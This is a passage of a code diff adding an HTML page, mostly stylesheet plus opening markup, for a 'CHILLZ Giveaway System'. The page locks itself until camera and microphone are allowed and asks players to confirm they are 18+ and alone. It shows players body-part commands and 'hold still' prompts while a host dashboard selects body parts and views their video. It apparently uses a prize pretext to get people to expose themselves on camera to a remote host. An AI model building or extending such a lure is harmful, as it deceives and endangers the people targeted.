+            overflow: hidden;
+            background: #000;
+            aspect-ratio: 9/16;
+            max-height: 50vh;
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            margin-bottom: 8px;
+        }
+        .player-cam-wrapper video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transform: scaleX(-1);
+            display: block;
+        }
+        .player-cam-wrapper .cam-overlay-label {
+            position: absolute;
+            bottom: 8px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(4px);
+            padding: 2px 14px;
+            border-radius: 40px;
+            font-size: 0.5rem;
+            color: rgba(255, 255, 255, 0.2);
+            letter-spacing: 0.05em;
+            border: 1px solid rgba(255, 255, 255, 0.02);
+            pointer-events: none;
+        }
+        /* Command overlay on camera */
+        .player-command-overlay {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 2.2rem;
+            font-weight: 800;
+            text-align: center;
+            pointer-events: none;
+            z-index: 7;
+            opacity: 0;
+            transition: opacity 0.3s ease, transform 0.3s ease;
+            text-shadow: 0 0 60px rgba(0, 0, 0, 0.8);
+            background: rgba(0, 0, 0, 0.5);
+            padding: 16px 30px;
+            border-radius: 20px;
+            backdrop-filter: blur(4px);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            color: #fff;
+            line-height: 1.4;
+            min-width: 120px;
+        }
+        .player-command-overlay.show {
+            opacity: 1;
+            transform: translate(-50%, -50%) scale(1);
+        }
+        .player-command-overlay .cmd-icon {
+            font-size: 2.8rem;
+            display: block;
+            margin-bottom: 4px;
+        }
+        .player-command-overlay .cmd-text {
+            font-size: 1.2rem;
+            letter-spacing: 0.05em;
+        }
+        .player-command-overlay .cmd-sub {
+            font-size: 0.7rem;
+            color: rgba(255, 255, 255, 0.3);
+            font-weight: 400;
+            letter-spacing: 0.05em;
+            margin-top: 2px;
+        }
+
+        .player-bodypart-display {
+            text-align: center;
+            padding: 4px 0 6px;
+            font-size: clamp(1rem, 2.5vw, 1.4rem);
+            font-weight: 700;
+            color: #fff;
+            letter-spacing: 2px;
+            min-height: 36px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        .player-bodypart-display .part-emoji {
+            font-size: 1.2rem;
+        }
+        .player-bodypart-display .part-name {
+            color: var(--neon-yellow);
+        }
+
+        .player-scanner-section {
+            margin: 4px 0 6px;
+            padding: 6px 10px;
+            background: rgba(255, 255, 255, 0.02);
+            border-radius: 10px;
+            border: 1px solid rgba(255, 255, 255, 0.04);
+        }
+        .player-scanner-section .scanner-header {
+            display: flex;
+            justify-content: space-between;
+            font-size: 0.55rem;
+            color: rgba(255, 255, 255, 0.15);
+            letter-spacing: 0.05em;
+            margin-bottom: 2px;
+        }
+        .player-scanner-section .scanner-header .label {
+            text-transform: uppercase;
+        }
+        .player-scanner-section .scanner-header .value {
+            color: #6bcbff;
+            font-family: 'SF Mono', monospace;
+            font-weight: 600;
+        }
+        .player-scanner-section .scanner-track {
+            width: 100%;
+            height: 5px;
+            border-radius: 20px;
+            background: rgba(255, 255, 255, 0.06);
+            overflow: hidden;
+            border: 1px solid rgba(255, 255, 255, 0.03);
+        }
+        .player-scanner-section .scanner-fill {
+            height: 100%;
+            width: 0%;
+            border-radius: 20px;
+            background: linear-gradient(90deg, #ff4466, var(--neon-yellow), var(--neon-green));
+            transition: width 0.15s ease;
+            box-shadow: 0 0 30px rgba(0, 255, 136, 0.05);
+        }
+
+        .ginger-panel {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            height: 100%;
+        }
+        .ginger-panel .ginger-header {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding-bottom: 4px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.04);
+        }
+        .ginger-panel .ginger-header .ginger-icon {
+            width: 36px;
+            height: 36px;
+            border-radius: 8px;
+            object-fit: cover;
+        }
+        .ginger-panel .ginger-header .ginger-label {
+            font-family: 'Orbitron', monospace;
+            font-size: 1.1rem;
+            font-weight: 700;
+            color: var(--neon-yellow);
+        }
+        .ginger-panel .ginger-header .ginger-pct {
+            font-family: 'Orbitron', monospace;
+            font-size: 1.6rem;
+            font-weight: 900;
+            color: var(--neon-green);
+            text-shadow: 0 0 30px rgba(0, 255, 136, 0.1);
+            margin-left: auto;
+            min-width: 50px;
+            text-align: right;
+        }
+        .ginger-panel .ginger-bar {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+        .ginger-panel .ginger-bar .bar-track {
+            width: 100%;
+            height: 10px;
+            border-radius: 20px;
+            background: rgba(255, 255, 255, 0.04);
+            overflow: hidden;
+            border: 1px solid rgba(255, 255, 255, 0.03);
+        }
+        .ginger-panel .ginger-bar .bar-fill {
+            height: 100%;
+            width: 0%;
+            border-radius: 20px;
+            background: linear-gradient(90deg, #ff4466, var(--neon-yellow), var(--neon-green));
+            transition: width 0.3s ease;
+            box-shadow: 0 0 30px rgba(0, 255, 136, 0.05);
+        }
+        .ginger-panel .ginger-bar .bar-label {
+            display: flex;
+            justify-content: space-between;
+            font-size: 0.6rem;
+            color: var(--text-dim);
+            margin-top: 3px;
+            letter-spacing: 1px;
+        }
+        .ginger-panel .ginger-stats {
+            font-size: 0.55rem;
+            color: var(--text-dim);
+            display: flex;
+            justify-content: space-between;
+            padding-top: 4px;
+            border-top: 1px solid rgba(255, 255, 255, 0.03);
+        }
+        .ginger-panel .ginger-stats span strong {
+            color: #fff;
+        }
+
+        .game-status {
+            text-align: center;
+            font-size: 0.75rem;
+            color: var(--text-dim);
+            padding: 2px 0 0;
+            letter-spacing: 1px;
+            min-height: 22px;
+        }
+
+        .player-hold-still {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 1.8rem;
+            font-weight: 800;
+            color: #ffa94d;
+            text-shadow: 0 0 60px rgba(255, 169, 77, 0.2);
+            pointer-events: none;
+            z-index: 6;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+            letter-spacing: 0.08em;
+            text-transform: uppercase;
+        }
+        .player-hold-still.show {
+            opacity: 1;
+            animation: pulseHold 0.7s ease-in-out infinite alternate;
+        }
+
+        .countdown-overlay {
+            position: absolute;
+            inset: 0;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 10;
+            background: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(8px);
+            border-radius: 30px;
+        }
+        .countdown-overlay.active {
+            display: flex;
+        }
+        .countdown-overlay .countdown-number {
+            font-family: 'Orbitron', monospace;
+            font-size: 5rem;
+            font-weight: 900;
+            color: #fff;
+            text-shadow: 0 0 80px rgba(255, 255, 255, 0.15);
+            animation: countdownPulse 0.8s ease-in-out infinite alternate;
+        }
+        @keyframes countdownPulse {
+            0% {
+                transform: scale(1.2);
+                opacity: 0.5;
+            }
+            100% {
+                transform: scale(1);
+                opacity: 1;
+            }
+        }
+        .countdown-overlay .countdown-text {
+            position: absolute;
+            bottom: 30%;
+            font-size: 1.1rem;
+            color: rgba(255, 255, 255, 0.1);
+            letter-spacing: 0.1em;
+            text-transform: uppercase;
+        }
+
+        /* ----- OVERLAYS ----- */
+        .overlay-18,
+        .overlay-username,
+        .overlay-alone,
+        .overlay-roomcode,
+        .overlay-prize {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.92);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 999;
+            padding: 24px;
+        }
+        .overlay-18.active,
+        .overlay-username.active,
+        .overlay-alone.active,
+        .overlay-roomcode.active,
+        .overlay-prize.active {
+            display: flex;
+        }
+        .overlay-18 .box,
+        .overlay-username .box,
+        .overlay-alone .box,
+        .overlay-roomcode .box,
+        .overlay-prize .box {
+            background: rgba(255, 255, 255, 0.02);
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            border-radius: 32px;
+            padding: 40px 36px;
+            max-width: 480px;
+            width: 100%;
+            text-align: center;
+        }
+        .overlay-18 .box h2 {
+            font-family: 'Orbitron', monospace;
+            font-size: 2rem;
+            color: #ff4466;
+            text-shadow: 0 0 60px rgba(255, 68, 102, 0.1);
+            margin-bottom: 8px;
+        }
+        .overlay-18 .box p {
+            color: var(--text-dim);
+            font-size: 1.05rem;
+            margin: 12px 0 24px;
+            line-height: 1.6;
+        }
+        .overlay-18 .box .btn-group {
+            display: flex;
+            gap: 14px;
+            justify-content: center;
+        }
+        .overlay-18 .box .btn-group button {
+            padding: 14px 40px;
+            border-radius: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            background: rgba(255, 255, 255, 0.02);
+            color: #fff;
+            font-family: 'Orbitron', monospace;
+            font-weight: 700;
+            font-size: 0.9rem;
+            cursor: pointer;
+            transition: 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        .overlay-18 .box .btn-group .btn-yes {
+            border-color: rgba(0, 255, 136, 0.15);
+            color: var(--neon-green);
+        }
+        .overlay-18 .box .btn-group .btn-yes:hover {
+            background: rgba(0, 255, 136, 0.04);
+            border-color: var(--neon-green);
+        }
+        .overlay-18 .box .btn-group .btn-no {
+            border-color: rgba(255, 68, 102, 0.1);
+            color: #ff4466;
+        }
+        .overlay-18 .box .btn-group .btn-no:hover {
+            background: rgba(255, 68, 102, 0.04);
+            border-color: #ff4466;
+        }
+
+        .overlay-username .box h2 {
+            font-family: 'Orbitron', monospace;
+            font-size: 1.6rem;
+            color: var(--neon-blue);
+            text-shadow: 0 0 40px rgba(0, 204, 255, 0.05);
+            margin-bottom: 8px;
+        }
+        .overlay-username .box p {
+            color: var(--text-dim);
+            font-size: 1rem;
+            margin: 12px 0 20px;
+            line-height: 1.6;
+        }
+        .overlay-username .box input {
+            width: 100%;
+            padding: 14px 18px;
+            border-radius: 16px;
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            background: rgba(255, 255, 255, 0.02);
+            color: #fff;
+            font-family: 'Rajdhani', sans-serif;
+            font-size: 1rem;
+            outline: none;
+            transition: 0.3s;
+            letter-spacing: 1px;
+            margin-bottom: 16px;
+        }
+        .overlay-username .box input:focus {
+            border-color: var(--neon-green);
+            box-shadow: 0 0 30px rgba(0, 255, 136, 0.05);
+        }
+        .overlay-username .box input::placeholder {
+            color: #555577;
+        }
+        .overlay-username .box .btn-submit {
+            padding: 14px 48px;
+            border-radius: 20px;
+            border: 1px solid rgba(0, 255, 136, 0.12);
+            background: rgba(0, 255, 136, 0.03);
+            color: var(--neon-green);
+            font-family: 'Orbitron', monospace;
+            font-weight: 700;
+            font-size: 0.9rem;
+            cursor: pointer;
+            transition: 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        .overlay-username .box .btn-submit:hover {
+            background: rgba(0, 255, 136, 0.06);
+            border-color: var(--neon-green);
+        }
+
+        .overlay-alone .box h2 {
+            font-family: 'Orbitron', monospace;
+            font-size: 1.6rem;
+            color: var(--neon-yellow);
+            text-shadow: 0 0 40px rgba(255, 230, 0, 0.05);
+            margin-bottom: 8px;
+        }
+        .overlay-alone .box p {
+            color: var(--text-dim);
+            font-size: 1rem;
+            margin: 12px 0 24px;
+            line-height: 1.6;
+        }
+        .overlay-alone .box button {
+            padding: 14px 48px;
+            border-radius: 20px;
+            border: 1px solid rgba(0, 255, 136, 0.12);
+            background: rgba(0, 255, 136, 0.03);
+            color: var(--neon-green);
+            font-family: 'Orbitron', monospace;
+            font-weight: 700;
+            font-size: 0.9rem;
+            cursor: pointer;
+            transition: 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        .overlay-alone .box button:hover {
+            background: rgba(0, 255, 136, 0.06);
+            border-color: var(--neon-green);
+        }
+
+        .overlay-roomcode .box h2 {
+            font-family: 'Orbitron', monospace;
+            font-size: 1.4rem;
+            color: var(--neon-green);
+            text-shadow: 0 0 40px rgba(0, 255, 136, 0.05);
+            margin-bottom: 8px;
+        }
+        .overlay-roomcode .box .room-code-display {
+            font-family: 'Orbitron', monospace;
+            font-size: 2.2rem;
+            font-weight: 900;
+            background: linear-gradient(135deg, var(--neon-green), var(--neon-blue));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            letter-spacing: 0.15em;
+            padding: 16px 0;
+            cursor: pointer;
+            user-select: all;
+            transition: all 0.3s;
+        }
+        .overlay-roomcode .box .room-code-display:hover {
+            transform: scale(1.05);
+        }
+        .overlay-roomcode .box .room-code-display .copy-hint {
+            font-size: 0.6rem;
+            font-family: 'Rajdhani', sans-serif;
+            font-weight: 400;
+            color: rgba(255, 255, 255, 0.2);
+            -webkit-text-fill-color: rgba(255, 255, 255, 0.2);
+            background: rgba(255, 255, 255, 0.03);
+            padding: 2px 12px;
+            border-radius: 40px;
+            display: inline-block;
+            margin-top: 4px;
+            letter-spacing: 1px;
+        }
+        .overlay-roomcode .box .copy-feedback {
+            font-size: 0.8rem;
+            color: var(--neon-green);
+            min-height: 24px;
+            margin-top: 4px;
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+        .overlay-roomcode .box .copy-feedback.show {
+            opacity: 1;
+        }
+        .overlay-roomcode .box p {
+            color: var(--text-dim);
+            font-size: 0.95rem;
+            margin: 4px 0 16px;
+            line-height: 1.5;
+        }
+        .overlay-roomcode .box .btn-continue {
+            background: linear-gradient(135deg, #00f5c0, #00a8ff);
+            color: #0b0e14;
+            border: none;
+            padding: 14px 48px;
+            border-radius: 60px;
+            font-family: 'Orbitron', monospace;
+            font-weight: 700;
+            font-size: 0.9rem;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 0.08em;
+            margin-top: 8px;
+        }
+        .overlay-roomcode .box .btn-continue:hover {
+            transform: scale(1.03);
+            box-shadow: 0 0 40px rgba(0, 245, 192, 0.15);
+        }
+
+        .overlay-prize .box h2 {
+            font-family: 'Orbitron', monospace;
+            font-size: 1.8rem;
+            color: var(--neon-yellow);
+            text-shadow: 0 0 60px rgba(255, 230, 0, 0.1);
+            margin-bottom: 8px;
+        }
+        .overlay-prize .box .prize-img {
+            width: 100%;
+            max-width: 280px;
+            border-radius: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            margin: 12px auto;
+            display: block;
+        }
+        .overlay-prize .box .prize-text {
+            color: #e8edf5;
+            font-size: 1.1rem;
+            font-weight: 600;
+            margin: 8px 0;
+        }
+        .overlay-prize .box .prize-sub {
+            color: var(--text-dim);
+            font-size: 0.9rem;
+            margin: 4px 0 12px;
+            line-height: 1.6;
+        }
+        .overlay-prize .box .prize-sub .highlight {
+            color: var(--neon-green);
+            font-weight: 600;
+        }
+        .overlay-prize .box .btn-restart {
+            background: linear-gradient(135deg, #00f5c0, #00a8ff);
+            color: #0b0e14;
+            border: none;
+            padding: 14px 48px;
+            border-radius: 60px;
+            font-family: 'Orbitron', monospace;
+            font-weight: 700;
+            font-size: 0.9rem;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 0.08em;
+            margin-top: 12px;
+        }
+        .overlay-prize .box .btn-restart:hover {
+            transform: scale(1.03);
+            box-shadow: 0 0 40px rgba(0, 245, 192, 0.15);
+        }
+
+        /* ----- QUEUE SCREEN ----- */
+        .queue-screen {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 40px 20px;
+            text-align: center;
+            gap: 16px;
+            min-height: 300px;
+        }
+        .queue-screen.active {
+            display: flex;
+        }
+        .queue-screen .spinner {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            border: 2px solid rgba(0, 255, 136, 0.05);
+            border-top-color: var(--neon-green);
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+        .queue-screen h2 {
+            font-family: 'Orbitron', monospace;
+            font-size: 1.4rem;
+            color: var(--text-dim);
+            font-weight: 400;
+            letter-spacing: 2px;
+        }
+        .queue-screen .sub {
+            color: #555577;
+            font-size: 0.85rem;
+            letter-spacing: 1px;
+        }
+        .queue-screen .queue-info {
+            color: var(--text-dim);
+            font-size: 0.95rem;
+            letter-spacing: 1px;
+            padding: 8px 16px;
+            border-radius: 12px;
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            background: rgba(255, 255, 255, 0.02);
+        }
+        .queue-screen .queue-info strong {
+            color: #fff;
+        }
+
+        /* ----- COMMENTS ----- */
+        .comments-section {
+            margin-top: 10px;
+            padding-top: 10px;
+            border-top: 1px solid rgba(255, 255, 255, 0.04);
+            width: 100%;
+        }
+        .comments-toggle {
+            background: rgba(255, 255, 255, 0.02);
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            color: var(--text-dim);
+            padding: 5px 14px;
+            border-radius: 30px;
+            font-family: 'Rajdhani', sans-serif;
+            font-size: 0.65rem;
+            cursor: pointer;
+            transition: 0.3s;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            position: relative;
+        }
+        .comments-toggle:hover {
+            border-color: rgba(255, 255, 255, 0.08);
+            color: #fff;
+        }
+        .comments-toggle .exclamation {
+            display: inline-block;
+            margin-left: 6px;
+            color: var(--neon-yellow);
+            font-weight: 900;
+            font-size: 0.8rem;
+            animation: pulseExclaim 1.2s ease-in-out infinite;
+            text-shadow: 0 0 20px rgba(255, 230, 0, 0.3);
+        }
+        @keyframes pulseExclaim {
+            0%,
+            100% {
+                opacity: 0.5;
+                transform: scale(0.9);
+            }
+            50% {
+                opacity: 1;
+                transform: scale(1.3);
+            }
+        }
+        .comments-toggle .exclamation.hidden {
+            display: none;
+        }
+        .comments-list {
+            display: none;
+            flex-direction: column;
+            gap: 6px;
+            margin-top: 8px;
+            padding: 8px 12px;
+            border-radius: 14px;
+            background: rgba(255, 255, 255, 0.02);
+            border: 1px solid rgba(255, 255, 255, 0.03);
+        }
+        .comments-list.open {
+            display: flex;
+        }
+        .comment-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 4px 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.03);
+            font-size: 0.75rem;
+            color: var(--text-dim);
+        }
+        .comment-item:last-child {
+            border-bottom: none;
+        }
+        .comment-item .stars {
+            color: var(--neon-yellow);
+            font-size: 0.65rem;
+            letter-spacing: 2px;
+            flex-shrink: 0;
+            margin-left: 10px;
+        }
+        .comment-item .anonymous {
+            color: #555577;
+            font-size: 0.6rem;
+            margin-right: 6px;
+        }
+
+        /* ----- BACK BUTTON ----- */
+        .back-btn {
+            background: rgba(255, 255, 255, 0.02);
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            color: var(--text-dim);
+            padding: 8px 20px;
+            border-radius: 30px;
+            font-family: 'Rajdhani', sans-serif;
+            font-size: 0.8rem;
+            cursor: pointer;
+            transition: 0.3s;
+            letter-spacing: 1px;
+            margin-top: 16px;
+        }
+        .back-btn:hover {
+            border-color: rgba(255, 255, 255, 0.08);
+            color: #fff;
+        }
+
+        /* ----- LOCK OVERLAY ----- */
+        .lock-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.95);
+            backdrop-filter: blur(30px);
+            -webkit-backdrop-filter: blur(30px);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+            padding: 24px;
+        }
+        .lock-overlay.active {
+            display: flex;
+        }
+        .lock-overlay .box {
+            text-align: center;
+            max-width: 480px;
+        }
+        .lock-overlay .box .icon {
+            font-size: 4rem;
+            margin-bottom: 16px;
+            display: block;
+        }
+        .lock-overlay .box h2 {
+            font-family: 'Orbitron', monospace;
+            font-size: 1.6rem;
+            color: #ff4466;
+            margin-bottom: 12px;
+        }
+        .lock-overlay .box p {
+            color: var(--text-dim);
+            font-size: 1.05rem;
+            line-height: 1.6;
+        }
+        .lock-overlay .box .retry-btn {
+            margin-top: 24px;
+            padding: 14px 48px;
+            border-radius: 20px;
+            border: 1px solid rgba(0, 255, 136, 0.12);
+            background: rgba(0, 255, 136, 0.03);
+            color: var(--neon-green);
+            font-family: 'Orbitron', monospace;
+            font-weight: 700;
+            font-size: 0.9rem;
+            cursor: pointer;
+            transition: 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        .lock-overlay .box .retry-btn:hover {
+            background: rgba(0, 255, 136, 0.06);
+            border-color: var(--neon-green);
+        }
+
+        /* ----- SKIP VOICE ----- */
+        .skip-voice-btn {
+            margin-top: 12px;
+            padding: 10px 32px;
+            border-radius: 30px;
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            background: rgba(255, 255, 255, 0.02);
+            color: var(--text-dim);
+            font-family: 'Rajdhani', sans-serif;
+            font-size: 0.85rem;
+            cursor: pointer;
+            transition: 0.3s;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+        }
+        .skip-voice-btn:hover {
+            border-color: rgba(255, 255, 255, 0.12);
+            color: #fff;
+            background: rgba(255, 255, 255, 0.04);
+        }
+
+        /* ----- RESPONSIVE ----- */
+        @media (max-width:600px) {
+            .glass {
+                padding: 16px 12px;
+                border-radius: 20px;
+            }
+            .menu-btn {
+                padding: 12px 14px;
+                font-size: 0.8rem;
+                flex-wrap: wrap;
+                gap: 6px;
+            }
+            .menu-btn .btn-left .btn-icon {
+                width: 30px;
+                height: 30px;
+            }
+            .menu-btn .btn-left {
+                font-size: 0.8rem;
+                gap: 8px;
+            }
+            .menu-btn .right {
+                gap: 4px;
+            }
+            .discount-row {
+                flex-direction: column;
+            }
+            .discount-row button {
+                width: 100%;
+            }
+            .boss-actions .actions-row button {
+                font-size: 0.5rem;
+                padding: 4px 8px;
+                min-width: 36px;
+                max-width: 70px;
+            }
+            .boss-part-selector .part-item {
+                font-size: 0.4rem;
+                padding: 2px 6px;
+                min-height: 16px;
+            }
+            .boss-part-selector .part-list {
+                max-height: 80px;
+            }
+            .boss-video-section {
+                min-height: 60px;
+                aspect-ratio: 9/16;
+            }
+            .overlay-18 .box,
+            .overlay-alone .box,
+            .overlay-username .box,
+            .overlay-roomcode .box,
+            .overlay-prize .box {
+                padding: 24px 16px;
+            }
+            .boss-grid {
+                grid-template-columns: 1fr;
+            }
+            .btn-ginger::before {
+                inset: -4px;
+            }
+            .boss-slider-section input[type="range"]::-webkit-slider-thumb {
+                width: 12px;
+                height: 12px;
+            }
+            .boss-player-info .info-row {
+                font-size: 0.45rem;
+                padding: 1px 0;
+            }
+            .boss-player-info .info-row .value {
+                font-size: 0.5rem;
+            }
+            .boss-player-info .info-row .label {
+                font-size: 0.35rem;
+            }
+            .boss-code-section .code-display .code-text {
+                font-size: 1rem;
+            }
+            .overlay-roomcode .box .room-code-display {
+                font-size: 1.4rem;
+            }
+            .player-cam-wrapper {
+                max-height: 35vh;
+                aspect-ratio: 9/16;
+            }
+            .countdown-overlay .countdown-number {
+                font-size: 3.5rem;
+            }
+            .player-game-row {
+                flex-direction: column;
+                gap: 10px;
+            }
+            .player-right-col {
+                flex-direction: row;
+                flex-wrap: wrap;
+                justify-content: center;
+                padding: 10px 12px;
+            }
+            .ginger-panel {
+                flex-direction: row;
+                flex-wrap: wrap;
+                align-items: center;
+                width: 100%;
+                justify-content: space-between;
+            }
+            .ginger-panel .ginger-header {
+                flex: 1;
+                min-width: 120px;
+                border-bottom: none;
+                padding-bottom: 0;
+            }
+            .ginger-panel .ginger-header .ginger-pct {
+                font-size: 1.2rem;
+            }
+            .ginger-panel .ginger-bar {
+                flex: 2;
+                min-width: 100px;
+            }
+            .ginger-panel .ginger-stats {
+                width: 100%;
+                justify-content: space-around;
+                border-top: 1px solid rgba(255, 255, 255, 0.03);
+                padding-top: 4px;
+                margin-top: 4px;
+            }
+            .player-bodypart-display {
+                font-size: 0.95rem;
+                min-height: 30px;
+            }
+            .game-status {
+                font-size: 0.65rem;
+            }
+            .player-command-overlay {
+                font-size: 1.6rem;
+                padding: 12px 20px;
+            }
+            .player-command-overlay .cmd-icon {
+                font-size: 2rem;
+            }
+            .player-command-overlay .cmd-text {
+                font-size: 1rem;
+            }
+        }
+
+        @media (max-width:420px) {
+            .game-container {
+                padding: 4px 2px 6px;
+                border-radius: 14px;
+            }
+            .score-box,
+            .timer-box {
+                font-size: 0.5rem;
+                padding: 2px 6px;
+                min-height: 24px;
+            }
+            .score-box span,
+            .timer-box span {
+                font-size: 0.7rem;
+                min-width: 14px;
+            }
+            .challenge-badge {
+                font-size: 0.55rem;
+                padding: 3px 6px;
+            }
+            .status-badge {
+                font-size: 0.45rem;
+                padding: 2px 5px;
+            }
+            .btn {
+                font-size: 0.55rem;
+                padding: 5px 8px;
+                min-height: 28px;
+            }
+            .btn-flip {
+                min-width: 28px;
+                padding: 5px 6px;
+                font-size: 0.6rem;
+            }
+            .gameover-overlay h2 {
+                font-size: 1.1rem;
+            }
+            .gameover-overlay .final-score {
+                font-size: 0.7rem;
+            }
+            .gameover-overlay .final-score span {
+                font-size: 1rem;
+            }
+            .points-popup {
+                font-size: 1.8rem;
+            }
+            .countdown-number {
+                font-size: 2.5rem;
+            }
+            .player-status-overlay {
+                bottom: 32px;
+                font-size: 0.45rem;
+                padding: 2px 8px;
+            }
+            #introScreen .intro-box h1 {
+                font-size: 1.1rem;
+            }
+            #introScreen .intro-box .code-input-group input {
+                font-size: 0.7rem;
+                padding: 6px 10px;
+            }
+            #hostDashboard {
+                padding: 4px 2px 6px;
+                border-radius: 12px;
+            }
+            .host-code-section .code-display .code-text {
+                font-size: 0.7rem;
+            }
+            .host-part-selector .part-item {
+                font-size: 0.4rem;
+                padding: 1px 5px;
+                min-height: 14px;
+            }
+            .host-part-selector .part-item .dot-color {
+                width: 4px;
+                height: 4px;
+            }
+            .host-part-selector .part-list {
+                max-height: 60px;
+            }
+            .host-video-section {
+                min-height: 50px;
+            }
+            .boss-actions .actions-row button {
+                font-size: 0.45rem;
+                padding: 3px 6px;
+                min-width: 30px;
+                max-width: 60px;
+            }
+            .host-slider-section input[type="range"]::-webkit-slider-thumb {
+                width: 8px;
+                height: 8px;
+            }
+            .host-player-info .info-row {
+                font-size: 0.4rem;
+                padding: 1px 0;
+            }
+            .host-player-info .info-row .value {
+                font-size: 0.45rem;
+            }
+            .host-code-section .all-codes .code-chip {
+                font-size: 0.4rem;
+                padding: 1px 5px;
+            }
+            .ginger-panel .ginger-header .ginger-pct {
+                font-size: 1rem;
+            }
+            .ginger-panel .ginger-header .ginger-label {
+                font-size: 0.8rem;
+            }
+            .player-bodypart-display {
+                font-size: 0.8rem;
+            }
+            .player-command-overlay {
+                font-size: 1.2rem;
+                padding: 10px 16px;
+            }
+            .player-command-overlay .cmd-icon {
+                font-size: 1.6rem;
+            }
+            .player-command-overlay .cmd-text {
+                font-size: 0.85rem;
+            }
+        }
+
+        .text-xs {
+            font-size: 0.5rem;
+            color: rgba(255, 255, 255, 0.12);
+            letter-spacing: 0.05em;
+        }
+        .text-sm {
+            font-size: 0.6rem;
+            color: rgba(255, 255, 255, 0.15);
+            letter-spacing: 0.05em;
+        }
+
+        .discount-area.hidden-boss {
+            display: none !important;
+        }
+
+        #screenMenu.boss-mode {
+            display: none !important;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ==================== LOCK OVERLAY ==================== -->
+    <div class="lock-overlay" id="lockOverlay">
+        <div class="box">
+            <span class="icon">🚫</span>
+            <h2>Camera &amp; Microphone Required</h2>
+            <p>Please enable your camera and microphone to continue.<br />Refresh the page after granting permissions.</p>
+            <button class="retry-btn" id="lockRetryBtn">↻ Try Again</button>
+        </div>
+    </div>
+
+    <!-- ==================== SCREEN 1: PERMISSION ==================== -->
+    <div id="screenPermission" class="screen active">
+        <div class="glass text-center">
+            <div class="title-glow">✦ CHILLZ ✦</div>
+            <div class="sub-glow mt-8">Giveaway System</div>
+            <div style="margin:24px 0 8px;font-size:3rem;">🎙️</div>
+            <p style="color:var(--text-dim);font-size:1rem;letter-spacing:1px;">
+                Please allow camera &amp; microphone access
+            </p>
+            <div id="permissionStatus" class="perm-granted" style="margin-top:18px;">
+                ⏳ Requesting permissions…
+            </div>
+            <button id="retryPermBtn" style="display:none;margin-top:16px;padding:12px 32px;border-radius:20px;border:1px solid rgba(0,255,136,0.1);background:rgba(0,255,136,0.03);color:var(--neon-green);font-family:'Orbitron',monospace;font-weight:700;font-size:0.8rem;cursor:pointer;letter-spacing:1px;">
+                ↻ Retry
+            </button>
+        </div>
+    </div>
+
+    <!-- ==================== SCREEN 2: VOICE "BEGIN" ==================== -->
+    <div id="screenVoice" class="screen">
+        <div class="glass text-center">
+            <div class="sub-glow" style="font-size:0.8rem;letter-spacing:4px;">🎤 VOICE ACTIVATED</div>
+            <div style="font-size:clamp(1.6rem,5vw,2.8rem);font-weight:700;margin:12px 0 4px;font-family:'Orbitron',monospace;color:#fff;">
+                Say <span style="color:var(--neon-green);text-shadow:0 0 40px rgba(0,255,136,0.1);">"begin"</span>
+            </div>
+            <div style="color:var(--text-dim);font-size:0.85rem;letter-spacing:2px;">to enter the giveaway</div>
+
+            <div class="voice-ring" id="voiceRing">
+                <div class="wave-bars"></div>
+                <span class="mic-icon">🎙️</span>
+            </div>
+            <div id="voiceStatus" style="font-size:0.9rem;color:var(--text-dim);letter-spacing:1px;min-height:28px;">
+                Listening…
+            </div>
+            <button class="skip-voice-btn" id="skipVoiceBtn">⏭ Skip (can't talk?)</button>
+        </div>
+    </div>
+
+    <!-- ==================== SCREEN 3: CHILLZ INTRO ==================== -->
+    <div id="screenChillz" class="screen">
+        <div class="chillz-container">
+            <div class="chillz-logo" id="chillzLogo">
+                <img src="chillz.png" alt="Chillz" onerror="this.style.display='none';this.nextElementSibling.style.display='flex';" />
